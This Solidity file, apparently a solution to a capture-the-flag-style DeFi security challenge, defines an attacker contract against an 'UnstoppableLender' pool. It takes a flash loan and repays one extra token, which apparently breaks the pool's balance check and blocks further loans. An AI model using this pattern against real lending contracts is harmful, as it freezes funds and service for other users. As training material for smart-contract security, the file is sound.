// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {UnstoppableLender, IReceiver} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";

contract UnstoppableAttacker is IReceiver {
    UnstoppableLender public lendingPool;

    constructor(address poolAddress) payable {
        lendingPool = UnstoppableLender(poolAddress);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external{
        IERC20 token = IERC20(tokenAddress);
        token.transfer(address(lendingPool), amount + 1);
    }

    function attack() external {
        lendingPool.flashLoan(100);
    }
}
